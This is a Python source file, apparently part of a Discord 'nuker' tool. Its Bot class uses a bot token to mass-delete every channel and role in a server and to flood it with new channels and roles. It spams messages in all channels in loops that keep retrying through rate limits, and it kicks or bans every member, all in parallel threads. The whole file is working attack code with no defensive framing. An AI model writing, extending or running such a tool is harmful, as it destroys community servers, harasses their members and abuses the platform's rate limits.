from .Utils import Utils
import threading
import requests
import json
import time

utils = Utils

class Bot:
	def __init__(self, token):
		self.token = token
		self.finalToken = f"Bot {token}"
		self.header = {"Authorization": self.finalToken}
		self.clear = False

	def createChannel(self, guildId, channelName):
		while True:
			r = requests.post(f'https://discord.com/api/v9/guilds/{guildId}/channels', headers=self.header, json=utils.getCrateChannelData(channelName))
			if r.status_code == 429:
				continue
			return r.status_code

	def createRole(self, guildId, roleName):
		while True:
			r = requests.post(f'https://discord.com/api/v9/guilds/{guildId}/roles', headers=self.header, json=utils.getCrateRoleData(roleName))
			if r.status_code == 429:
				continue
			return r.status_code

	def deleteChannel(self, channelId):
		while True:
			r = requests.delete(f'https://discord.com/api/v9/channels/{channelId}', headers=self.header)
			if r.status_code == 429:
				continue
			return r.status_code

	def deleteRole(self, guildId, roleId):
		while True:
			r = requests.delete(f'https://discord.com/api/v9/guilds/{guildId}/roles/{roleId}', headers=self.header)
			if r.status_code == 429:
				continue
			return r.status_code

	def sendMessage(self, channelId, message):
		r = requests.post(f'https://discord.com/api/v9/channels/{channelId}/messages', headers=self.header, data=utils.getMessageData(message))
		return r.status_code

	def spamMessageInChannel(self, channelId, message):
		while True:
			s = self.sendMessage(channelId, message)
			if s != 200 and s != 429:
				return
			if self.clear:
				break

	def kickMember(self, guildId, memberId):
		r = requests.delete(f'https://discord.com/api/v9/guilds/{guildId}/members/{memberId}', headers=self.header)
		return r.status_code

	def banMember(self, guildId, memberId):
		r = requests.put(f'https://discord.com/api/v9/guilds/{guildId}/bans/{memberId}', headers=self.header)
		return r.status_code

	def createChannels(self, guildId, name, count):
		for i in range(count):
			th = threading.Thread(target=self.createChannel, args=(guildId, name,))
			th.start()

	def createRoles(self, guildId, name, count):
		for i in range(count):
			th = threading.Thread(target=self.createRole, args=(guildId, name,))
			th.start()

	def deleteAllChannels(self, guildId):
		channels = Utils.getIdOfAllChannel(self, guildId, 500)
		for i in range(utils.getChannelCount(self, guildId, 500)):
			th = threading.Thread(target=self.deleteChannel, args=(channels[i],))
			th.start()

	def deleteAllRoles(self, guildId):
		roles = Utils.getIdOfAllRole(self, guildId, 500)
		for i in range(utils.getRoleCount(self, guildId, 500)):
			th = threading.Thread(target=self.deleteRole, args=(guildId, roles[i],))
			th.start()

	def spamMessageInTheChannel(self, channelId, message):
		th = threading.Thread(target=self.spamMessageInChannel, args=(channelId, message,))
		th.start()

	def spamAllChannels(self, guildId, message):
		channels = Utils.getIdOfAllChannel(self, guildId, 500)
		for i in range(utils.getChannelCount(self, guildId, 500)):
			th = threading.Thread(target=self.spamMessageInChannel, args=(channels[i], message,))
			th.start()

	def kickAllMember(self, guildId):
		members = Utils.getIdOfAllMember(self, guildId)
		for i in range(utils.getMemberCount(self, guildId)):
			th = threading.Thread(target=self.kickMember, args=(guildId, members[i - 1],))
			th.start()

	def banAllMember(self, guildId):
		members = Utils.getIdOfAllMember(self, guildId)
		for i in range(utils.getMemberCount(self, guildId)):
			th = threading.Thread(target=self.banMember, args=(guildId, members[i - 1],))
			th.start()

	def clearTask(self):
		self.clear = True
		time.sleep(2)
		self.clear = False